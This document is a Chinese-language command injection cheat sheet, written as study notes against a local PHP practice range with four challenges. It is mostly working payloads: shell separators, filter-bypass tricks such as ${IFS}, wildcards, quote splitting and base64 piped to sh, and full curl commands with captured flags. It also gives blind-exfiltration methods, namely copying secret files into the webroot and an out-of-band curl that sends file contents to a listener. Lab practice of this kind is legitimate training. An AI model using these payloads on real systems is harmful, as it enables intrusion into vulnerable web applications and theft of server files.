# 命令注入速查 v2(战地百科·PHP→Linux)

> 用法:做题卡住 → 按"我现在处于什么情况"翻章节 → 照 payload 改路径改文件名
> 命令环境:**CMD**(URL 已预编码,可直接粘进 CMD 的 curl 双引号内;payload 本体在目标机的 Linux sh 里执行,CMD 只负责运输)
> 验证标注:✓(YYYY-MM-DD)=当日靶场实弹;【教材知识】=PHP/Shell 标准行为未逐项实弹;未标注 = 原理成立未搭场景
> 靶场:http://localhost:8082/ -- ci1(直接拼接) / ci2(拦分号) / ci3(拦空白+cat+flag) / ci4(拦 ;|&换行)

## 0. 拿到题先走这个流程
========================================================

```
1. 读源码:找 system/exec/shell_exec/passthru/反引号 + 用户输入拼接 → 就是注入点
   注意拼接方式:ping -c 1 ". $ip(命令尾追加) vs echo ". $ip(echo 场景,见 ci4)
2. 先看回显函数:system/passthru 直接输出 → 有回显路线;exec/shell_exec/反引号 → 多半无回显
3. 有回显 → 分隔符接命令 → 直接读 flag
4. 无回显 → sleep 时间信道验证(第 4 节) → OOB 带出
5. 有黑名单 → 第 3 节绕过表(先看黑名单拦的是字面量还是 \s 这种字符类)
```

## 1. 分隔符全家桶(一条命令变两条)
========================================================

| 符号 | 含义 | 示例 |
|------|------|------|
| ; | 顺序执行(不管成败) | 127.0.0.1;id |
| && | 前面成功才执行 | 127.0.0.1&&id |
| \|\| | 前面失败才执行 | 127.0.0.1\|\|id |
| \| | 管道(前输出喂给后) | 127.0.0.1\|id |
| %0a | 换行(=分号,URL 编码) | 127.0.0.1%0aid |
| `cmd` / $(cmd) | 命令替换(先执行,结果当文本;**不需要分隔符!**) | echo `id` |
| & | 后台执行 | 127.0.0.1&id |

**URL 编码表(CMD 手打按这个)**:; → %3B ｜ 空格 → %20 ｜ \| → %7C ｜ & → %26(**&& → %26%26**)｜ 换行 → %0a ｜ ' → %27 ｜ # → %23 ｜ + → %2B ｜ ` $ ( ) { } 原样合法

**⚠️ 裸 && 假阳性(2026-08-30 从 SQL 表平移,普适)**:URL 裸写 && 时,& 是参数分隔符,
payload 被拆成两个参数,注入静默死亡。CMD 双引号内的 & 原样发送,但服务端照样按 & 拆——
所以 & 永远写 %26。鉴别法与 SQL 表 1.2 相同:换假条件看结果变不变。

**CMD 注意**:payload 含双引号时 CMD 里写 \" 或换单引号;^ 是 CMD 转义符,出现时写 ^^(本表 payload 不含);%xx 在交互式 CMD 不展开,放心用。

## 2. 场景实弹(靶场四题完整 CMD 弹药)✓(2026-08-30)
========================================================

```
ci1 直接拼接(无过滤,flag=/first.txt):
curl "http://localhost:8082/ci1/?ip=127.0.0.1%3Bcat%20/first.txt"        → flag{ci1_direct} ✓

ci2 拦分号(黑名单只有 ;,flag=/second.txt):
curl "http://localhost:8082/ci2/?ip=127.0.0.1%0Acat%20/second.txt"       → flag{ci2_pipe} ✓
curl "http://localhost:8082/ci2/?ip=127.0.0.1%7Ccat%20/second.txt"       → flag{ci2_pipe} ✓
curl "http://localhost:8082/ci2/?ip=127.0.0.1%26%26cat%20/second.txt"    → flag{ci2_pipe} ✓
(规律:拦一个分隔符,全家桶里还有五个;黑名单=有限名单拦无限集合)

ci3 拦空白+cat+flag(正则 [\s]|cat|flag /i,flag=/flag.txt——路径里就有 flag 字样!):
curl "http://localhost:8082/ci3/?ip=127.0.0.1%3Btac${IFS}/fla*"          → flag{ci3_nospace} ✓
   tac 替 cat(反序输出,内容一样) ｜ ${IFS} 替空格 ｜ fla* 通配躲 flag 字样
   负例实证:cat%09/... → %09(Tab) 被 \s 连坐拦死,见第 3 节坑 ①
   负例实证:{cat,/flag.txt} → 花括号展开本身可行,但 payload 里有 flag 字样照样死

ci4 拦 ;|&换行(echo 场景,flag=/fourth.txt——没有分隔符也能执行:命令替换):
curl "http://localhost:8082/ci4/?msg=$(cat%20/fourth.txt)"               → flag{ci4_backtick} ✓
curl "http://localhost:8082/ci4/?msg=`cat%20/fourth.txt`"                → flag{ci4_backtick} ✓
   $( ) 和反引号是"先执行、结果当文本",不需要任何分隔符;echo 把结果原样带出来
```

**另两种拼接场景(未搭靶,原理成立)**:
- 注入点在引号内:`system("ping -c 1 \"" . $ip . "\"")` → 先破引号再接分隔符,payload=`"; id #`
  (破开引号成空参数 → 分隔符 → # 吃掉尾巴;引号配平思路同 SQL 表 2.5)
- 目标是 Windows(cmd.exe):分隔符 & \| 直接用,^ 是转义符;读文件用 `type C:\flag.txt`;
  ${IFS} 等全部 bash 技巧失效,空格靠 PHP 解码 %20 或直接写;引号里用 " 而非 '

## 3. 绕过速查(拦什么换什么)
========================================================

| 被拦 | 换什么 | 例子 |
|------|--------|------|
| 空格 | ${IFS} ✓ | cat${IFS}/flag.txt |
| 空格 | $IFS$9 | cat$IFS$9/flag.txt |
| 空格 | 重定向 < | cat</flag.txt |
| cat | tac / head / tail / more / less / nl / sort | tac /flag.txt |
| flag 字样 | 通配符 | cat /fla* / /f???.txt |
| cat/flag | 引号拆开(不影响执行) | c""at /fla"g"* |
| 关键字 | 变量拼接 | a=ca;b=t;$a$b /flag.txt |
| 分隔符全拦 | 命令替换(不需要分隔符) | $(cat /flag.txt) ✓ |
| 危险字符全拦+有长度余量 | base64 | echo Y2F0IC9mbGFnLnR4dA==\|base64 -d\|sh |

**坑**:
① **%09(Tab) 只对"字面空格"黑名单有效**——黑名单写 \s 或 [\s] 时 Tab 换行全被连坐(2026-08-30 实证);先看正则再选绕法
② ${IFS} 在 bash/dash 都可用;{cat,/flag.txt} 花括号展开是 **bash 专属**(PHP 的 sh 是 dash,用不了)
③ 通配符要在目标机的 shell 里展开,所以 /fla* 这种写法由目标机解析,本机 CMD 不需要认识它
④ 黑名单是正则时,先盯"字符类"(如 \s)再盯字面量——字符类拦的是一族,字面量只拦一个
⑤ base64 payload 里经常有 **+**:URL 里必须写 %2B,裸 + 会被解码成空格、base64 直接解坏
   (+ 号三态,SQL 表 2.4 同款坑;本表例子 Y2F0IC9... 恰好不含 +,别的 payload 不保证)

## 4. 无回显信道(三条路,全部实弹)
========================================================

**路 1·时间信道 ✓(2026-08-30,ci1 实测 3.2s)**:

```
curl -s -o NUL -w "%{time_total}" "http://目标/?ip=127.0.0.1;sleep 3"
   页面卡住 N 秒 = 命令执行了;CMD 下 NUL 是 Windows 的黑洞文件写法
sleep 被拦 → ping 延迟替代 ✓(2026-08-30,;ping -c 3 127.0.0.1 实测 2.3s):
   ICMP 约 1 秒/包,N 包 ≈ N-1 秒;ping 也没了用 wget --timeout 凑
```

**路 2·写进 web 目录再 HTTP 读 ✓(2026-08-30 实弹全链)**:无回显但有回读通道时最舒服:

```
ip=127.0.0.1;cp /flag.txt /var/www/html/stolen.txt   → 然后 curl http://目标/stolen.txt
```
现实检验:php:apache 镜像 webroot 对 www-data 可写,一次成功;生产站 webroot 多半只读,
写 /tmp 则 HTTP 够不着——不通就走路 3。

**路 3·OOB 带外 ✓(2026-08-30 实弹全链,靶机→本机监听)**:

```
本机先起监听:  python -m http.server 8888
注入:          ip=127.0.0.1;curl http://host.docker.internal:8888/$(cat /flag.txt)
监听日志收到 GET /flagci1_direct = 命令替换 + 外带全链通(练武场容器回连宿主机走 host.docker.internal)
```

⚠️ **外带 URL 里的 { } 会被 curl 当 glob 语法吃掉**(实测 flag{ci1_direct} 只剩 flagci1_direct):
   目标机的 curl 加 --globoff 可保原样(实测 GET /gflag{ci1_direct} ✓),或外带前先 base64/编码内容

## 5. 危险函数速查【教材知识】
========================================================

| PHP 函数 | 执行命令 | 有回显? |
|----------|----------|---------|
| system() | ✅ | ✅ 直接输出 |
| passthru() | ✅ | ✅ 直接输出(二进制友好) |
| exec() | ✅ | ❌ 只返回最后一行,要自己 echo |
| shell_exec() | ✅ | ❌ 返回全部输出,要自己 echo |
| 反引号 `` `cmd` `` | ✅ | ❌ 等价 shell_exec |
| popen() / proc_open() | ✅ | 返回句柄自己读 |

**PHP 读输入**:$_GET['x'] / $_POST['x'] / $_SERVER['HTTP_XXX'](UA 头也能成为注入点)

## 6. 报错导航
========================================================

| 报错/现象 | 意思 | 怎么办 |
|-----------|------|--------|
| sh: 1: xxx: not found | 目标机没这个命令 | 换 ls / whoami / env 探环境 |
| 页面卡 N 秒 | sleep 生效 = 注入存在 | 时间信道成立,逐位取数据 |
| 什么都不输出 | 函数无回显(exec 类) | sleep 验证 + 盲注/OOB |
| 显示黑名单提示 | 有过滤 | 第 3 节绕过表,先看正则拦的是字符类还是字面量 |
| 页面只有 ping 结果 | payload 没拼进去 | 检查参数名、URL 编码(& 写 %26 了没) |

## 心法
========================================================

> 先读源码找危险函数 ｜ 分隔符挨个试,拦一个换一个 ｜ 拦字符类比拦字面量狠 ｜ 命令替换不需要分隔符 ｜ 无回显就 sleep ｜ 黑盒速查表(course/黑盒开局速查.md)管开头,这份管打进去之后
